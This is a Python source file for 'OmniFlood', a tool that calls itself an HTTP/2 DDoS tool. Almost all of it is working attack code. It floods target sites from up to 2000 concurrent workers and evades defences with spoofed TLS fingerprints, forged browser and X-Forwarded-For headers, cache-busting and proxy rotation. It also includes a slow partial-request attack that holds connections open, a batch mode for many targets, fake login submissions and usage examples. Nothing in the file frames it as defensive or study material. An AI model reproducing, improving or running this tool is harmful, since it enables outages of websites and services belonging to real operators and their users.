#!/usr/bin/env python3
"""
OmniFlood v3.1 - Fixed Session Leaks
CATShadow - Supreme Coder
"""

import asyncio
import aiohttp
import ssl
import random
import time
import socket
import hashlib
import json
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple, Set
import argparse
import sys
import os
import signal
import gc
from urllib.parse import urlparse, urlencode
import h2.connection
import h2.config
import h2.events
import h2.settings
from h2.exceptions import ProtocolError, NoSuchStreamError
import aiohttp_socks
import logging

# Disable aiohttp logging spam
logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
logging.getLogger('aiohttp_socks').setLevel(logging.CRITICAL)

# ==================== CONFIGURATION ====================
MAX_WORKERS = 2000
CONNECTION_POOL_SIZE = 500
PROXY_REFRESH_INTERVAL = 300  # seconds

# ==================== JA3 FINGERPRINTS ====================
JA3_SIGNATURES = [
    {
        "name": "Chrome 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    },
    {
        "name": "Firefox 120-130",
        "ciphers": [
            "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
        ],
        "curves": ["X25519", "secp256r1", "secp384r1", "secp521r1"],
        "next_protos": ["h2", "http/1.1"],
        "min_version": ssl.TLSVersion.TLSv1_2,
        "max_version": ssl.TLSVersion.TLSv1_3
    }
]

# ==================== BROWSER PROFILES ====================
BROWSER_PROFILES = {
    "chrome": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ],
        "sec_ch_ua": '"Google Chrome";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
        "platform": "Windows"
    },
    "firefox": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
        ],
        "sec_ch_ua": '"Firefox";v="120", "Gecko";v="120"',
        "platform": "Windows"
    },
    "edge": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
        ],
        "sec_ch_ua": '"Microsoft Edge";v="120", "Chromium";v="120", "Not?A_Brand";v="24"',
        "platform": "Windows"
    }
}

# ==================== UTILITY FUNCTIONS ====================
def rand_str(length: int) -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def rand_int(min_val: int, max_val: int) -> int:
    return random.randint(min_val, max_val)

def rand_bool() -> bool:
    return random.choice([True, False])

def random_ip() -> str:
    return f"{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}"

def generate_cache_bust() -> str:
    methods = [
        f"?v={rand_int(1,1000000)}",
        f"?_={int(time.time()*1000)}",
        f"?rnd={rand_str(16)}"
    ]
    return random.choice(methods)

def generate_path(base_path: str = "/") -> str:
    paths = [
        "/", "/index.html", "/home", "/main", "/default", "/welcome",
        "/api/v1/users", "/api/v1/data", "/api/v2/info",
        "/wp-admin", "/admin", "/login", "/dashboard",
        f"/page/{rand_int(1,1000)}",
        f"/post/{rand_str(8)}"
    ]
    return random.choice(paths)

def generate_student_number() -> str:
    return f"{rand_int(2015,2025)}-{rand_int(1,99999):05d}"

def generate_cookies() -> str:
    cookies = []
    if rand_bool():
        cookies.append(f"session_id={rand_str(24)}")
    if rand_bool():
        cookies.append(f"csrf_token={rand_str(16)}")
    return "; ".join(cookies) if cookies else ""

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        self.index = 0
        self.lock = asyncio.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file: str):
        with open(proxy_file, 'r') as f:
            self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    async def get_proxy(self) -> Optional[str]:
        async with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

# ==================== CONNECTION POOL WITH PROPER CLEANUP ====================
class ConnectionPool:
    def __init__(self, target: str, proxy_manager: Optional[ProxyManager] = None, pool_size: int = 500):
        self.target = target
        self.proxy_manager = proxy_manager
        self.pool_size = pool_size
        self.sessions: List[aiohttp.ClientSession] = []
        self.session_lock = asyncio.Lock()
        self.used_sessions: Set[aiohttp.ClientSession] = set()
        self.closed = False
        self._cleanup_task = None
        
    def _create_ssl_context(self) -> ssl.SSLContext:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        
        ja3 = random.choice(JA3_SIGNATURES)
        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
        ssl_ctx.minimum_version = ja3['min_version']
        ssl_ctx.maximum_version = ja3['max_version']
        ssl_ctx.set_alpn_protocols(['h2', 'http/1.1'])
        
        return ssl_ctx
    
    def _generate_headers(self) -> Dict:
        profile_name = random.choice(list(BROWSER_PROFILES.keys()))
        profile = BROWSER_PROFILES[profile_name]
        
        headers = {
            'User-Agent': random.choice(profile['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9']),
            'Sec-Ch-Ua': profile['sec_ch_ua'],
            'Sec-Ch-Ua-Mobile': '?0' if rand_bool() else '?1',
            'Sec-Ch-Ua-Platform': f'"{profile["platform"]}"',
            'Sec-Fetch-Dest': random.choice(['document', 'script', 'image']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
            'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
            'DNT': '1',
            'X-Forwarded-For': random_ip(),
            'X-Real-IP': random_ip(),
            'Connection': 'keep-alive',
        }
        
        if rand_bool():
            headers['X-Requested-With'] = 'XMLHttpRequest'
        if rand_bool():
            cookies = generate_cookies()
            if cookies:
                headers['Cookie'] = cookies
        
        return headers
    
    async def _create_session(self) -> Optional[aiohttp.ClientSession]:
        try:
            proxy_url = await self.proxy_manager.get_proxy() if self.proxy_manager else None
            
            connector = None
            timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=30)
            
            if proxy_url:
                if proxy_url.startswith('socks5://'):
                    connector = aiohttp_socks.SocksConnector.from_url(
                        proxy_url,
                        ssl=self._create_ssl_context(),
                        force_close=True,
                        limit=100,
                        limit_per_host=100,
                        ttl_dns_cache=300
                    )
                else:
                    connector = aiohttp.TCPConnector(
                        ssl=self._create_ssl_context(),
                        force_close=True,
                        limit=100,
                        limit_per_host=100,
                        ttl_dns_cache=300,
                        keepalive_timeout=30
                    )
            else:
                connector = aiohttp.TCPConnector(
                    ssl=self._create_ssl_context(),
                    force_close=True,
                    limit=100,
                    limit_per_host=100,
                    ttl_dns_cache=300,
                    keepalive_timeout=30
                )
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=self._generate_headers()
            )
            return session
        except Exception:
            return None
    
    async def get_session(self) -> Optional[aiohttp.ClientSession]:
        if self.closed:
            return None
            
        async with self.session_lock:
            # Clean dead sessions
            self.sessions = [s for s in self.sessions if not s.closed]
            self.used_sessions = {s for s in self.used_sessions if not s.closed}
            
            # Create new sessions if needed
            while len(self.sessions) < self.pool_size:
                session = await self._create_session()
                if session:
                    self.sessions.append(session)
                else:
                    break
            
            # Get an unused session
            available = [s for s in self.sessions if s not in self.used_sessions and not s.closed]
            if available:
                session = random.choice(available)
                self.used_sessions.add(session)
                return session
            
            # If all sessions are used, try to recycle old ones
            if len(self.sessions) >= self.pool_size:
                # Try to use any session (they should handle concurrency)
                session = random.choice(self.sessions)
                if not session.closed:
                    return session
            
            return None
    
    def release_session(self, session: aiohttp.ClientSession):
        """Release a session back to the pool"""
        if session and not self.closed:
            asyncio.create_task(self._release_session_async(session))
    
    async def _release_session_async(self, session: aiohttp.ClientSession):
        async with self.session_lock:
            if session in self.used_sessions:
                self.used_sessions.remove(session)
    
    async def close(self):
        """Properly close all sessions"""
        if self.closed:
            return
            
        self.closed = True
        
        async with self.session_lock:
            # Close all sessions
            for session in self.sessions:
                try:
                    if not session.closed:
                        await session.close()
                except:
                    pass
            
            self.sessions.clear()
            self.used_sessions.clear()
            
            # Force garbage collection
            gc.collect()
    
    async def start_cleanup(self):
        """Periodic cleanup of dead sessions"""
        while not self.closed:
            await asyncio.sleep(60)
            async with self.session_lock:
                self.sessions = [s for s in self.sessions if not s.closed]
                self.used_sessions = {s for s in self.used_sessions if not s.closed}

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, target: str, mode: str, duration: int, rate: int, proxy_manager: Optional[ProxyManager] = None):
        self.target = target
        self.mode = mode.upper()
        self.duration = duration
        self.rate = rate
        self.proxy_manager = proxy_manager
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.running = True
        self.pool = ConnectionPool(target, proxy_manager, CONNECTION_POOL_SIZE)
        self.semaphore = asyncio.Semaphore(MAX_WORKERS)
        
    def _generate_attack_headers(self) -> Dict:
        headers = self.pool._generate_headers()
        
        if rand_bool():
            headers['X-Custom-Header'] = rand_str(20)
        if rand_bool():
            headers['X-Forwarded-For'] = random_ip()
        if rand_bool():
            headers['Via'] = f'1.1 {random_ip()}'
        
        return headers
    
    async def attack_worker(self):
        while self.running:
            try:
                async with self.semaphore:
                    session = await self.pool.get_session()
                    if not session:
                        await asyncio.sleep(0.1)
                        continue
                    
                    path = generate_path()
                    if rand_int(1,100) <= 70:
                        path += generate_cache_bust()
                    
                    full_url = self.target.rstrip('/') + path
                    
                    # Generate mode-specific payload
                    data = None
                    if self.mode == 'POST':
                        data = f"student_id={generate_student_number()}&password={rand_str(12)}"
                        if rand_bool():
                            data = json.dumps({
                                'username': rand_str(10),
                                'password': rand_str(15),
                                'email': f"{rand_str(8)}@example.com"
                            })
                    
                    # Make request with proper cleanup
                    start_time = time.time()
                    try:
                        async with session.request(
                            method=self.mode if self.mode != 'SLOW' else 'GET',
                            url=full_url,
                            data=data,
                            headers=self._generate_attack_headers(),
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            if self.mode != 'HEAD':
                                await response.read()
                            self.stats['success'] += 1
                    except Exception:
                        self.stats['failed'] += 1
                    finally:
                        # Release session back to pool
                        self.pool.release_session(session)
                    
                    self.stats['total'] += 1
                    
                    # Rate limiting
                    elapsed = time.time() - start_time
                    if elapsed < (1/self.rate):
                        await asyncio.sleep((1/self.rate) - elapsed)
                    
            except Exception:
                await asyncio.sleep(0.1)
    
    async def run(self):
        # Start cleanup task
        cleanup_task = asyncio.create_task(self.pool.start_cleanup())
        
        # Start workers
        workers = [asyncio.create_task(self.attack_worker()) for _ in range(min(MAX_WORKERS, 2000))]
        
        # Stop after duration
        await asyncio.sleep(self.duration)
        self.running = False
        
        # Wait for workers to finish
        if workers:
            await asyncio.wait(workers, timeout=10)
        
        # Cleanup
        cleanup_task.cancel()
        try:
            await cleanup_task
        except asyncio.CancelledError:
            pass
        
        await self.pool.close()
        
        return self.stats

# ==================== HTTP/1.1 SLOW ATTACK ====================
class SlowAttackEngine:
    def __init__(self, target: str, duration: int, rate: int):
        self.target = target
        self.duration = duration
        self.rate = rate
        self.stats = {'total': 0, 'connections': 0}
        self.running = True
        
    async def slow_worker(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = 443 if parsed.scheme == 'https' else 80
        is_https = parsed.scheme == 'https'
        
        while self.running:
            try:
                # Create socket connection
                reader, writer = await asyncio.open_connection(
                    host, port, ssl=is_https if is_https else None
                )
                
                # Send partial HTTP request
                request = (
                    f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(BROWSER_PROFILES['chrome']['user_agents'])}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {random_ip()}\r\n"
                )
                
                # Send request slowly
                lines = request.split('\r\n')
                for i, line in enumerate(lines):
                    if not self.running:
                        break
                    writer.write((line + '\r\n').encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                
                if not self.running:
                    writer.close()
                    await writer.wait_closed()
                    break
                
                self.stats['connections'] += 1
                self.stats['total'] += 1
                
                # Keep connection alive
                await asyncio.sleep(30)
                writer.close()
                await writer.wait_closed()
                
            except Exception:
                pass
            
            await asyncio.sleep(1/self.rate if self.rate > 0 else 0.1)
    
    async def run(self):
        workers = [asyncio.create_task(self.slow_worker()) for _ in range(1000)]
        
        await asyncio.sleep(self.duration)
        self.running = False
        
        # Wait for workers to finish
        if workers:
            await asyncio.wait(workers, timeout=10)
        
        return self.stats

# ==================== BATCH ATTACK ====================
class BatchAttack:
    def __init__(self, targets_file: str, mode: str, duration: int, rate: int, proxy_file: Optional[str] = None):
        self.targets = []
        self.mode = mode
        self.duration = duration
        self.rate = rate
        self.proxy_file = proxy_file
        
        with open(targets_file, 'r') as f:
            self.targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    async def attack_target(self, target: str):
        proxy_manager = ProxyManager(self.proxy_file) if self.proxy_file else None
        engine = AttackEngine(target, self.mode, self.duration, self.rate // len(self.targets), proxy_manager)
        stats = await engine.run()
        return target, stats
    
    async def run(self):
        tasks = [self.attack_target(target) for target in self.targets]
        results = await asyncio.gather(*tasks)
        
        print("\n" + "="*70)
        print("BATCH ATTACK COMPLETE")
        print("="*70)
        total_requests = 0
        total_success = 0
        total_failed = 0
        for target, stats in results:
            print(f"\nTarget: {target}")
            print(f"  Total Requests: {stats['total']}")
            print(f"  Success: {stats['success']}")
            print(f"  Failed: {stats['failed']}")
            total_requests += stats['total']
            total_success += stats['success']
            total_failed += stats['failed']
        
        print(f"\n{'='*70}")
        print(f"TOTAL: {total_requests} requests, {total_success} success, {total_failed} failed")
        print(f"{'='*70}")
        
        return results

# ==================== MAIN ====================
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="OmniFlood - HTTP/2 DDoS Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python omni.py https://target.com 60 GET 1000
  python omni.py https://target.com 120 POST 500 --proxies proxies.txt
  python omni.py https://target.com 30 HEAD 2000 --slow
  python omni.py --batch targets.txt 60 GET 100 --proxies proxies.txt
  python omni.py https://target.com 60 SLOW 10
        """
    )
    
    parser.add_argument('target', nargs='?', help='Target URL')
    parser.add_argument('duration', nargs='?', type=int, help='Attack duration in seconds')
    parser.add_argument('mode', nargs='?', choices=['GET', 'POST', 'HEAD', 'SLOW'], help='Attack mode')
    parser.add_argument('rate', nargs='?', type=int, help='Requests per second')
    parser.add_argument('--proxies', help='Proxy file (ip:port per line)')
    parser.add_argument('--batch', help='Targets file (one per line)')
    parser.add_argument('--slow', action='store_true', help='Use slow attack (HTTP/1.1 partial requests)')
    parser.add_argument('--threads', type=int, default=2000, help='Number of concurrent workers')
    
    args = parser.parse_args()
    
    if args.batch:
        if not os.path.exists(args.batch):
            print(f"[!] Batch file not found: {args.batch}")
            sys.exit(1)
        return args
    
    if not args.target or not args.duration or not args.mode or not args.rate:
        parser.print_help()
        sys.exit(1)
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
    
    return args

async def main_async():
    # Handle Ctrl+C gracefully
    loop = asyncio.get_running_loop()
    
    args = parse_arguments()
    
    print(f"""
    🐱 CATShadow OmniFlood v3.1 (Session Leak Fixed)
    {'='*50}
    Target: {args.target if not args.batch else 'BATCH MODE'}
    Duration: {args.duration}s
    Mode: {args.mode if not args.batch else 'MIXED'}
    Rate: {args.rate}/s
    Workers: {args.threads}
    Proxies: {args.proxies if args.proxies else 'DIRECT'}
    """)
    
    # Batch mode
    if args.batch:
        batch = BatchAttack(args.batch, args.mode or 'GET', args.duration, args.rate, args.proxies)
        await batch.run()
        return
    
    # Setup proxy manager
    proxy_manager = ProxyManager(args.proxies) if args.proxies else None
    
    # Slow attack
    if args.mode == 'SLOW' or args.slow:
        engine = SlowAttackEngine(args.target, args.duration, args.rate)
        stats = await engine.run()
        print(f"\nSlow Attack Complete: {stats['total']} requests, {stats['connections']} connections kept open")
        return
    
    # Regular attack
    engine = AttackEngine(args.target, args.mode, args.duration, args.rate, proxy_manager)
    
    try:
        stats = await engine.run()
        print(f"\n{'='*50}")
        print("ATTACK COMPLETE")
        print(f"{'='*50}")
        print(f"Total Requests: {stats['total']}")
        print(f"Successful: {stats['success']}")
        print(f"Failed: {stats['failed']}")
        if stats['total'] > 0:
            print(f"Success Rate: {(stats['success']/stats['total']*100):.1f}%")
        print(f"{'='*50}")
    except asyncio.CancelledError:
        print("\n[!] Attack cancelled")
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        # Ensure cleanup
        await engine.pool.close()

def signal_handler():
    """Handle SIGINT gracefully"""
    print("\n[!] Received interrupt signal, cleaning up...")
    # This will be handled by the asyncio loop

if __name__ == "__main__":
    # Set up signal handlers
    signal.signal(signal.SIGINT, lambda s, f: signal_handler())
    
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        # Force cleanup
        gc.collect()
        sys.exit(0)
